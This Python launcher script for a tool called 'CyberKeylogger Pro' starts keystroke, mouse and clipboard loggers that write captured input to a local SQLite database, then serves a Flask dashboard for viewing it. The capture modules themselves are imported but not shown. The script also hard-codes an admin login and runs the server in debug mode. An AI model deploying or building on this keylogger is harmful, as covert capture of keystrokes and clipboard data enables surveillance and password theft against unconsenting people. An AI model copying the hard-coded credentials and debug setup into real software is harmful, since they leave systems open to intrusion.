from server.webapp import create_app
from core.keylogger import KeyLogger
from core.mouse_logger import MouseLogger
from core.clipboard_logger import ClipboardLogger
from database.db_manager import DBManager
from database.models import DatabaseModels
import os
import sys

# Initialize database
def init_database():
    """Initialize database with tables and default data"""
    try:
        # Create data directory if it doesn't exist
        os.makedirs('data', exist_ok=True)
        
        # Initialize database models
        db_models = DatabaseModels('data/logs.db')
        print("✅ Database initialized successfully")
        
    except Exception as e:
        print(f"❌ Database initialization failed: {e}")
        sys.exit(1)

# Initialize the application
def init_app():
    """Initialize all application components"""
    print("🚀 Initializing CyberKeylogger Pro...")
    
    # Initialize database
    init_database()
    
    # Initialize database manager
    db_manager = DBManager('data/logs.db', 'password')
    
    # Initialize logging services
    mouse_logger = MouseLogger(callback=lambda event: db_manager.insert_mouse_event(event))
    keystroke_logger = KeyLogger(callback=lambda event: db_manager.insert_keystroke(event))
    clipboard_logger = ClipboardLogger(callback=lambda event: db_manager.insert_clipboard(event))
    
    # Start logging services
    try:
        mouse_logger.start()
        keystroke_logger.start()
        clipboard_logger.start()
        print("✅ Logging services started")
    except Exception as e:
        print(f"⚠️  Warning: Some logging services failed to start: {e}")
    
    return db_manager

if __name__ == '__main__':
    # Initialize application
    db_manager = init_app()
    
    # Create Flask app
    app = create_app()
    
    # Run on different port to avoid conflicts
    port = 5001
    print(f"🌐 Starting server on http://127.0.0.1:{port}")
    print("📊 Dashboard: http://127.0.0.1:5001")
    print("🔐 Login with: superadmin_@gmail.com / P@$$word123")
    print("💡 Press Ctrl+C to stop the server")
    
    try:
        app.run(debug=True, host='127.0.0.1', port=port)
    except KeyboardInterrupt:
        print("\n🛑 Server stopped by user")
    except Exception as e:
        print(f"❌ Server error: {e}")